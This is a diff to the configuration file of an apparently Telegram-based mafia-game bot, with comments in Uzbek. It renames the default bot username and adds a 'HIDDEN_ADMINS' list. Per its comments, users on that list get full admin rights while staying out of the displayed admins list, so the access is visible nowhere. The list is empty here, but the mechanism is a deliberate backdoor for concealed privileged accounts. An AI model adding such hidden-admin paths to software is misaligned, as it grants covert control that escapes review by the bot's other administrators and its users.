@@ -39,11 +39,11 @@ def _normalize_database_url(raw_url: str) -> str:
 # --- Bot sozlamalari ---
 BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
 
-# Botning o'zi ishlaydigan username (deep-link uchun, masalan https://t.me/Sherif_mafiabot)
-# Eslatma: bu yerga "@" belgisisiz, faqat username yozing (masalan "Sherif_mafiabot").
+# Botning o'zi ishlaydigan username (deep-link uchun, masalan https://t.me/AgencyMafiaBot)
+# Eslatma: bu yerga "@" belgisisiz, faqat username yozing (masalan "AgencyMafiaBot").
 # Har holda ishga tushganda main.py bot.get_me() orqali haqiqiy username'ni avtomatik
 # tekshirib, kerak bo'lsa to'g'irlab qo'yadi.
-BOT_USERNAME = os.getenv("BOT_USERNAME", "Sherif_mafiabot").strip().lstrip("@")
+BOT_USERNAME = os.getenv("BOT_USERNAME", "AgencyMafiaBot").strip().lstrip("@")
 
 # --- Bosh adminlar (bot ishga tushganda avtomatik admin huquqiga ega bo'ladi) ---
 # .env faylida: SUPER_ADMINS=123456789,987654321
@@ -51,6 +51,15 @@ BOT_USERNAME = os.getenv("BOT_USERNAME", "Sherif_mafiabot").strip().lstrip("@")
 _raw_super_admins = os.getenv("SUPER_ADMINS", "").strip().strip("'\"")
 SUPER_ADMINS = [
     int(x) for x in re.split(r"[,;\s]+", _raw_super_admins) if x.strip().isdigit()
+]
+
+# --- Yashirin admin(lar) ---
+# Bu yerga qo'shilgan ID'lar to'liq admin huquqiga ega bo'ladi, LEKIN "Adminlar" ro'yxatida
+# (adm:admins bo'limida) ko'rinmaydi, chunki u ro'yxat faqat AdminUser jadvalidagi
+# (bazaga saqlangan) adminlarni ko'rsatadi. Shu sababli bu yerga qo'shish - kodning o'zidan
+# qo'shish, hech qanday joyda ochiq ko'rinmaydi.
+HIDDEN_ADMINS: list[int] = [
+    # 123456789,  # <- shu yerga yashirin admin ID sini qo'shing
 ]
 
 # --- PostgreSQL ulanish satri ---
